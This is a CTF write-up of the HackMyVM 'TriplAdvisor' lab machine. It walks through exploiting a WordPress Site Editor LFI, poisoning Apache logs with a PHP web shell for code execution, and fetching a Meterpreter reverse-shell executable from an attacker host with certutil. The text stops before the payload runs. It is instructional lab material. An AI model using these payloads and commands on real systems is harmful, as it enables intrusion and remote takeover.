---
title: Write-up TriplAdvisor on HackMyVM
author: eMVee
date: 2026-11-07 00:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, Windows, OSCP, CMSEEK, WordPress, LFI, Log poisoning, Potato, JuicyPotato, SeImpersonatePrivilege]
render_with_liquid: false
---

In this writeup, I will walk you through the initial steps of solving the **TripleAdvisor** vulnerable machine. This host provides a great exercise in scanning, service identification, and proper local routing configuration.

- **Machine:** [TriplAdvisor](https://downloads.hackmyvm.eu/tripladvisor.zip)
- **Difficulty:** Easy
- **Core concepts:** LFI, Log poisoning, Potato, JuicyPotato, SeImpersonatePrivilege

Let's dive straight into the technical process.

## Getting started
The first step was to identify the target IP address within the local subnet. I created a dedicated project directory and used `fping` to sweep the network.


```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents

┌──(emvee㉿kali)-[~/Documents]
└─$ mkdir TripleAdvisor

┌──(emvee㉿kali)-[~/Documents]
└─$ cd TripleAdvisor

┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.41

┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ ip=10.0.2.41
```
The active target was successfully identified at 10.0.2.41. I assigned this value to the `$ip` environment variable to streamline the subsequent commands.

## Enumeration
With the target IP confirmed, I executed a comprehensive `nmap` scan covering all TCP ports (`-p-`), running default scripts (`-sC`), and performing version detection (`-sV`).
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ sudo nmap -sC -sV -T4 -p- $ip 
[sudo] password for emvee: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-05 22:20 +0100
Nmap scan report for 10.0.2.41
Host is up (0.00050s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          Apache httpd
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to http://tripladvisor:8080/wordpress/
|_http-server-header: Apache
MAC Address: 08:00:27:E7:8E:D2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_clock-skew: 9h00m00s
| smb2-time: 
|   date: 2026-11-06T06:22:46
|_  start_date: 2026-11-06T06:19:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.86 seconds

```

Some interesting information is identified with nmap.
- **Operating System:** Although port 8080 runs Apache, the `Service Info` explicitly identifies the underlying OS as **Windows**.
- **SMB (Port 445) & WinRM (Port 5985):** Both ports are open, which typically indicates standard Windows remote management and file-sharing capabilities. These are crucial vectors to keep in mind for later privilege escalation or lateral movement.
- **Web Server (Port 8080):** An Apache server is running and automatically attempts to redirect incoming traffic to a specific internal hostname: `http://tripladvisor:8080/wordpress/`.

Because the web server forces a redirect to a custom domain name (`tripladvisor`) rather than the raw IP address, browsing directly via the IP fails. To resolve this, I manually appended the hostname mapping to the local `/etc/hosts` file.

```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ sudo nano /etc/hosts   

┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ cat /etc/hosts                                                     
127.0.0.1       localhost secure.hmv
127.0.1.1       kali
10.0.2.41       tripladvisor

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
To streamline the rest of the assessment, I mapped the complete path to a dedicated local environment variable.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ url=http://tripladvisor:8080/wordpress/ 
```
With the local DNS routing successfully configured, I analyzed the web application stack using `whatweb` to understand the technologies running behind the scenes.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ whatweb http://tripladvisor:8080/wordpress/
http://tripladvisor:8080/wordpress/ [200 OK] Apache, Bootstrap[5.1.19], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], HttpOnly[PHPSESSID], IP[10.0.2.41], JQuery[1.12.4], PoweredBy[WordPress,], Script[text/javascript], Title[TriplAdvisor &#8211; The best travel online guide!], UncommonHeaders[link], WordPress, x-pingback[http://tripladvisor:8080/wordpress/xmlrpc.php]

```
Now that our environment variables are set and the target application is reachable, it is time to move from general reconnaissance to targeted enumeration. Our goal is to identify specific software versions, active themes, plugins, and potential usernames on the WordPress platform.

First let's check the website in the browser.
![image](/assets/img/WriteUp/HackMyVM/TriplAdvisor/Pasted image 20261105222944.png){: width="700" height="400" }

It looks like a travel blog. To automate the initial discovery of the WordPress ecosystem, I executed `cmseek` against our target URL.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ cmseek -u $url   
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Deep Scan Results  [+] 

 ┏━Target: tripladvisor:8080
 ┃
 ┠── CMS: WordPress
 ┃    │
 ┃    ╰── URL: https://wordpress.org
 ┃
 ┠──[WordPress Deepscan]
 ┃    │
 ┃    ├── Readme file found: http://tripladvisor:8080/wordpress//readme.html
 ┃    ├── License file: http://tripladvisor:8080/wordpress//license.txt
 ┃    │
 ┃    ├── Plugins Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Plugin: editor
 ┃    │        │
 ┃    │        ├── Version: 4.3
 ┃    │        ╰── URL: http://tripladvisor:8080/wordpress//wp-content/plugins/editor
 ┃    │
 ┃    │
 ┃    ├── Themes Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Theme: expert-adventure-guide
 ┃    │        │
 ┃    │        ├── Version: 5.1.19
 ┃    │        ╰── URL: http://tripladvisor:8080/wordpress//wp-content/themes/expert-adventure-guide
 ┃    │
 ┃    │
 ┃    ├── Usernames harvested: 1
 ┃    │    ╰── admin
 ┃    │
 ┃
 ┠── Result: /home/emvee/Documents/TripleAdvisor/Result/tripladvisor_8080_wordpress/cms.json
 ┃
 ┗━Scan Completed in 21.49 Seconds, using 44 Requests



 CMSeeK says ~ Annyeong
```

Some intresting information what should be listed to our notes.
- **User Discovery:** The scan successfully extracted a valid administrative account username: `admin`.
- **Active Theme:** The platform uses a theme named `expert-adventure-guide` (v5.1.19).
- **Installed Plugin:** A plugin simply named `editor` was discovered at the standard path `/wp-content/plugins/editor`.


The `cmseek` output listed the plugin version as `4.3`. However, automated tools can sometimes misinterpret version strings by reading the core WordPress version instead. To verify the true version of the `editor` plugin, I used `curl` to fetch its native `readme.txt` file.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ curl http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
=== Site Editor - WordPress Site Builder - Theme Builder and Page Builder ===
Contributors: wpsiteeditor
Tags: site editor, site builder, page builder, theme builder, theme framework, design, inline editor, inline text editor, layout builder,live options, live, customizer, theme customizer, header builder, footer builder, fully customizable, design options,design editor, options framework, front end, page builder plugin, builder, responsive, front end editor, landing page, editor, drag-and-drop, shortcode, wordpress, ultra flexible, unlimited tools, elements, modules, support, seo, animation, absolute flexibility, live theme options, video backgrounds, font awesome, Optimized, fast, quick, ux, ui
Requires at least: 4.7
Tested up to: 4.7.4
Stable tag: 1.1
License: GPLv3
License URI: https://www.gnu.org/licenses/gpl-3.0.html

SiteEditor is The best solution for build your Wordpress site with The best drag and drop WordPress Site, theme and Page Builder.Any theme, any page, any design.

== Description ==

**What is the Site Editor?**

Site Editor is the most powerful Site Builder which is designed for WordPress. It's a powerful, advanced, user-friendly front end editor and you can build your website via drag and drop and full live options. Site Editor is also a powerful front-end platform for the developer.

```
We should make some notes on the information found in the readme file.
- **The Full Name:** The actual name of the plugin is **Site Editor - WordPress Site Builder**.
- **The Real Version:** The `Stable tag` field reveals that the plugin is running version **1.1**. This is a critical finding, as older iterations of page builder plugins often suffer from severe handling vulnerabilities.

With a confirmed plugin name (`Site Editor`) and an exact version number (`1.1`), I queried the local Exploit Database archive using `searchsploit` to check for public exploits.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ searchsploit wordpress editor
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Aviary Image Editor Addon For Gravity Forms 3.0 Beta - Arbitrary | php/webapps/37275.txt
WordPress Plugin EditorMonkey 2.5 - 'FCKeditor' Arbitrary File Upload             | php/webapps/17284.txt
WordPress Plugin Monsters Editor for WP Super Edit - Arbitrary File Upload        | php/webapps/37654.txt
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                         | php/webapps/44340.txt
WordPress Plugin User Role Editor 3.12 - Cross-Site Request Forgery               | php/webapps/25721.txt
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                   | php/webapps/44595.rb
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
The search returned a highly promising match: **WordPress Plugin Site Editor 1.1.1 - Local File Inclusion (LFI)** located at `php/webapps/44340.txt`.

Since our target runs version **1.1**, it falls directly within the vulnerable range for this specific exploit. A Local File Inclusion vulnerability on a Windows infrastructure running Apache could potentially allow us to read sensitive configuration files, system logs, or even achieve Remote Code Execution (RCE) via log poisoning or session manipulation.

To understand how the vulnerability works and how to structure our payload, I downloaded the exploit script locally using `searchsploit -m` and reviewed its contents with `cat`.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ searchsploit -m 44340        
  Exploit: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/44340
     Path: /usr/share/exploitdb/exploits/php/webapps/44340.txt
    Codes: CVE-2018-7422
 Verified: True
File Type: Unicode text, UTF-8 text
Copied to: /home/emvee/Documents/TripleAdvisor/44340.txt

┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ cat 44340.txt                                                               
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-editor/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422

** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

** Technical details **
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php:5, the value of the ajax_path parameter is used for including a file with PHP’s require_once(). This parameter can be controlled by an attacker and is not properly sanitized.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.

** Timeline **
03/01/2018: author contacted through siteeditor.org's contact form; no reply
16/01/2018: issue report filled on the public GitHub page with no technical details
18/01/2018: author replies and said he replied to our e-mail 8 days ago (could not find the aforementioned e-mail at all); author sends us "another" e-mail
19/01/2018: report sent; author says he will fix this issue "very soon"
31/01/2018: vendor contacted to ask about an approximate release date and if he needs us to postpone the disclosure; no reply
14/02/2018: WP Plugins team contacted; no reply
06/03/2018: vendor contacted; no reply
07/03/2018: vendor contacted; no reply
15/03/2018: public disclosure

** Credits **
Vulnerability discovered by Nicolas Buzy-Debat working at Orange Cyberdefense Singapore (CERT-LEXSI).

--
Best Regards,

Nicolas Buzy-Debat
Orange Cyberdefense Singapore (CERT-LEXSI)      
```
The technical details pinpoint the exact flaw in `ajax_shortcode_pattern.php`. The script checks if the user-supplied parameter `ajax_path` exists, evaluates whether it points to a file, and then immediately runs it through PHP's `require_once()` function:

- **The Flaw:** There is absolutely no sanitization or input validation on the path provided. The script blindly trusts whatever value is sent to the `ajax_path` parameter.
- **The Environment Catch:** The original advisory showcases a Linux-based PoC pointing to `/etc/passwd`. However, as our early `nmap` reconnaissance revealed, our target is running **Windows**.

Because this is a Windows machine, standard Linux paths like `/etc/passwd` or directory traversal sequences like `../../../../etc/passwd` will not work. Instead, we need to adapt the attack vectors for a Windows environment. We can target classic Windows system files (such as `C:\Windows\win.ini`) or look for internal WordPress installation configurations like `wp-config.php` to extract database credentials.

With the technical analysis complete, it was time to adapt the public exploit to match our target infrastructure. Since the machine runs **Windows** under the hood, I replaced the Linux-specific `/etc/passwd` reference with a classic Windows target file: `/windows/win.ini`.

I executed a `curl` request against the vulnerable endpoint, passing the absolute Windows path to the `ajax_path` parameter:
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ curl -s 'http://tripladvisor:8080/wordpress//wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/windows/win.ini'                   
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
{"success":true,"data":{"output":[]}} 
```
The exploit worked flawlessly. The web server immediately responded by processing the file inclusion and returning the contents of the local `win.ini` file:

- `; for 16-bit app support`
- `[fonts]`
- `MAPI=1`

The trailing JSON payload `{"success":true,"data":{"output":[]}}` confirms that after including our requested file, the PHP script finished its normal execution blocks successfully.

While manually reading `win.ini` proved the Local File Inclusion (LFI) vulnerability exists, manually guessing file paths on a Windows filesystem is inefficient. To discover more sensitive files and find potential components for our next attack vector, I automated the path discovery using `wfuzz`.

I utilized the specialized Windows LFI wordlist from SecLists (`LFI-gracefulsecurity-windows.txt`) and filtered out uninteresting responses using the `--hh 72` flag to hide standard default-sized replies.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ wfuzz -c -w //usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ" --hh 72 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ
Total requests: 236

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000045:   200        7 L      13 W       129 Ch      "C:/Windows/win.ini"       
000000044:   200        21 L     135 W      861 Ch      "C:/WINDOWS/System32/drivers/etc/hosts"            
000000049:   200        1701 L   34637 W    362123 Ch   "C:/xampp/apache/logs/access.log"                  
000000155:   200        1813 L   35981 W    388650 Ch   "c:/xampp/apache/logs/access.log"                  
000000161:   200        564 L    2563 W     21507 Ch    "c:/xampp/apache/conf/httpd.conf"                  
000000165:   200        0 L      1 W        37 Ch       "c:/xampp/phpMyAdmin/config.inc.php"               
000000164:   500        0 L      0 W        0 Ch        "c:/xampp/php/php.ini"                             
000000166:   200        72 L     319 W      2133 Ch     "c:/xampp/sendmail/sendmail.ini"                   
000000230:   200        0 L      1 W        37 Ch       "c:/WINDOWS/setuperr.log"                          
000000156:   200        33799    713656 W   5755763 C   "c:/xampp/apache/logs/error.log"                   
                        L                   h                                                              
000000228:   200        176 L    1036 W     14543 Ch    "c:/WINDOWS/setupact.log"                          
000000222:   200        27 L     171 W      1395 Ch     "c:/WINDOWS/system32/drivers/etc/protocol"         
000000223:   200        285 L    1238 W     17500 Ch    "c:/WINDOWS/system32/drivers/etc/services"         
000000233:   200        2808 L   28891 W    227488 Ch   "c:/WINDOWS/WindowsUpdate.log"                     
000000221:   200        16 L     55 W       444 Ch      "c:/WINDOWS/system32/drivers/etc/networks"         
000000220:   200        79 L     585 W      3720 Ch     "c:/WINDOWS/system32/drivers/etc/lmhosts.sam"      
000000219:   200        21 L     135 W      861 Ch      "c:/WINDOWS/system32/drivers/etc/hosts"            
000000050:   200        33799    713656 W   5755763 C   "C:/xampp/apache/logs/error.log"                   
                        L                   h                                                              

Total time: 0
Processed Requests: 236
Filtered Requests: 218
Requests/sec.: 0


```

Running `wfuzz` shows some interesting information such as
- **the architecture context:** The paths confirm the target uses a **XAMPP** installation stack (`C:/xampp/`), which heavily clarifies the directory structure.
- **system files:** Standard configuration networks like the `hosts` file were accessible.
- **the crown jewels (log files):** Crucially, the scanner successfully fetched both the Apache access log (`C:/xampp/apache/logs/access.log`) and error log.

Access to web server log files via an LFI vulnerability is a classic high-severity indicator. If the web server allows us to read the `access.log` file, we can inspect incoming HTTP requests. More importantly, it means any data we inject into an HTTP header (like the User-Agent) might get written into this file, giving us a potential vector for **Log Poisoning**.

To verify the integrity of the log data, I used `curl` to pull the access log and inspected the initial entries using `head`.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ curl -s 'http://tripladvisor:8080/wordpress//wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/xampp/apache/logs/access.log' | head -n 10
192.168.56.1 - - [14/Aug/2024:10:42:52 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/error.log HTTP/1.1" 200 5728866 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:43:07 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 272 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:44:38 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 504 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:52:26 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 736 "-" "curl/8.8.0"
192.168.56.1 - - [15/Aug/2024:21:00:56 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 968 "-" "curl/8.8.0"
192.168.56.1 - - [25/Nov/2024:22:26:47 -0800] "GET / HTTP/1.1" 302 - "-" "curl/8.10.1"
10.0.2.3 - - [05/Nov/2026:22:22:24 -0800] "GET / HTTP/1.0" 302 - "-" "-"
10.0.2.3 - - [05/Nov/2026:22:22:45 -0800] "PROPFIND / HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.3 - - [05/Nov/2026:22:22:45 -0800] "GET / HTTP/1.0" 302 - "-" "-"
10.0.2.3 - - [05/Nov/2026:22:22:45 -0800] "OPTIONS / HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

```
The output confirms that the file is completely readable and dynamically logs requests in real-time. We can clearly observe old diagnostic requests, historical local network scanning patterns, and our own automated Nmap script checks (`Nmap Scripting Engine`) recorded inside the server history.

With a confirmed read primitive over the active Apache access logs, the stage is perfectly set to transition from arbitrary file reading to code execution.

In the previous phase, we confirmed a Local File Inclusion (LFI) flaw and discovered that the Apache access log file (`C:\xampp\apache\logs\access.log`) is fully readable. When an LFI vulnerability allows reading web server logs, it frequently opens the door to **Log Poisoning**.

By injecting PHP code into an HTTP header field that gets tracked inside the logs, we can force the web server to execute our code when the log file is processed via the LFI script.

Every time an HTTP request reaches the server, Apache logs specific details, including the client's `User-Agent`. I crafted a `curl` request targeting the WordPress home directory, replacing the standard User-Agent header with a minimal PHP web shell payload: `<?php system($_GET['cmd']); ?>`.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ curl -A "<?php system(\$_GET['cmd']);?>"  http://tripladvisor:8080/wordpress/ 
<!DOCTYPE html>
<html lang="en-US">
        <head>
 <!-- Built With SiteEditor | http://www.siteeditor.org --> 

                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <link rel="profile" href="https://gmpg.org/xfn/11">
                                        <link rel="pingback" href="http://tripladvisor:8080/wordpress/xmlrpc.php">
                                <title>TriplAdvisor &#8211; The best travel online guide!</title>
<meta name='robots' content='noindex,follow' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="TriplAdvisor &raquo; Feed" href="http://tripladvisor:8080/wordpress/feed/" />
<link rel="alternate" type="application/rss+xml" title="TriplAdvisor &raquo; Comments Feed" href="http://tripladvisor:8080/wordpress/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="TriplAdvisor &raquo; Home Comments Feed" href="http://tripladvisor:8080/wordpress/sample-page/feed/" />
                <script type="text/javascript">
                        window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11.2.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11.2.0\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/tripladvisor:8080\/wordpress\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.1.19"}};
                        
                        < ------ SNIP ------>

                }(jQuery));
            </script>
            </body></html><!-- Thanks for stopping by. Have an amazing day! -->                                                                                                                    

```

Once the log file was successfully poisoned, the next step was to execute commands remotely. I called the vulnerable `ajax_shortcode_pattern.php` path via `curl`, loaded the poisoned `access.log` using the `ajax_path` parameter, and appended a test command (`cmd=dir`) to target the Windows environment.

When PHP interpreted the log file via `require_once()`, it encountered our injected User-Agent line and executed the `system('dir')` wrapper. Nestled inside the logged records, the server successfully dumped the complete file layout of the active working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=dir"      
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0192.168.56.1 - - [14/Aug/2024:10:42:52 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/error.log HTTP/1.1" 200 5728866 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:43:07 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 272 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:44:38 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 504 "-" "curl/8.8.0"
192.168.56.1 - - [14/Aug/2024:10:52:26 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 736 "-" "curl/8.8.0"
192.168.56.1 - - [15/Aug/2024:21:00:56 -0700] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:/xampp/apache/logs/access.log HTTP/1.1" 200 968 "-" "curl/8.8.0"
192.168.56.1 - - [25/Nov/2024:22:26:47 -0800] "GET / HTTP/1.1" 302 - "-" "curl/8.10.1"
10.0.2.3 - - [05/Nov/2026:22:22:24 -0800] "GET / HTTP/1.0" 302 - "-" "-"
10.0.2.3 - - [05/Nov/2026:22:22:45 -0800] "PROPFIND / HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.3 - - [05/Nov/2026:22:22:45 -0800] "GET / HTTP/1.0" 302 - "-" "-"
10.0.2.3 - - [05/Nov/2026:22:22:45 -0800] "OPTIONS / HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

curl: (23) Failure writing output to destination, passed 11584 returned 3952


<---- SNIP ---->

10.0.2.3 - - [05/Nov/2026:13:56:13 -0800] "GET /wordpress//wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/xampp/apache/logs/access.log HTTP/1.1" 200 414163 "-" "curl/8.20.0"
10.0.2.3 - - [05/Nov/2026:13:56:34 -0800] "GET /wordpress//wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/xampp/apache/logs/access.log HTTP/1.1" 200 414394 "-" "curl/8.20.0"
10.0.2.3 - - [05/Nov/2026:13:57:16 -0800] "GET /wordpress/ HTTP/1.1" 200 22542 "-" " Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes

06/30/2024  09:00 AM    <DIR>          .
06/30/2024  09:00 AM    <DIR>          ..
06/30/2024  09:00 AM             9,400 ajax_shortcode_pattern.php
06/30/2024  09:00 AM            26,382 pagebuilder-options-manager.class.php
06/30/2024  09:00 AM            68,418 pagebuilder.class.php
06/30/2024  09:00 AM             5,561 pagebuildermodules.class.php
06/30/2024  09:00 AM            34,306 pb-shortcodes.class.php
06/30/2024  09:00 AM            16,293 pb-skin-loader.class.php
               6 File(s)        160,360 bytes
               2 Dir(s)  23,849,029,632 bytes free
"
10.0.2.3 - - [05/Nov/2026:13:58:31 -0800] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=whoami HTTP/1.1" 200 414712 "-" "curl/8.20.0"
10.0.2.3 - - [05/Nov/2026:13:59:09 -0800] "GET /wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\\xampp\\apache\\logs\\access.log&cmd=whoami HTTP/1.1" 200 414959 "-" "curl/8.20.0"
{"success":true,"data":{"output":[]}}    
```
The output proves that we have successfully bypassed application context and established full **Remote Code Execution (RCE)** on the target machine as the user running the Apache service.

## Initial access
With arbitrary code execution verified via the web log poisoning vector, the next step was to transition from an unstable web-based shell to a fully interactive control session. Since the underlying operating system is Windows, spawning a robust 64-bit Meterpreter shell was the optimal choice for post-exploitation.

First, I utilized msfvenom to generate a malicious 64-bit Windows executable (shell.exe) that executes a staged reverse TCP handshake back to the attacking Kali machine (10.0.2.3).
Simultaneously, I initiated Metasploit's multi-handler interface to listen for the incoming connection on port 4444.
```
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f exe -o shell.exe && msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 4444; run" 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => eth0
LPORT => 4444
[*] Started reverse TCP handler on 10.0.2.3:4444 

```
To move the compiled binary from the attack platform to the target server, I hosted a lightweight file transport layer by spinning up Python's built-in HTTP server module on port 80.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
To pull down the payload through our active RCE channel, I leveraged the native Windows binary `certutil.exe`. This tool contains an update cache module (`-urlcache`) capable of fetching remote binaries over HTTP.
I directed certutil to download `shell.exe` from my python web server and drop it into `C:\Windows\Temp\`, which is a typical globally writable directory on Windows infrastructures.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=certutil+-urlcache+-split+-f+http://10.0.2.3/shell.exe+C:\Windows\Temp\shell.exe"

```
The terminal running the Python instance captured the incoming connections immediately, confirming the file transfer completed successfully.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.41 - - [06/Nov/2026 09:16:37] "GET /shell.exe HTTP/1.1" 200 -
10.0.2.41 - - [06/Nov/2026 09:16:37] "GET /shell.exe HTTP/1.0" 200 -

```
With the executable staged inside the target's temporary directory, the final step was to execute the file by calling its absolute path through our web shell endpoint.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
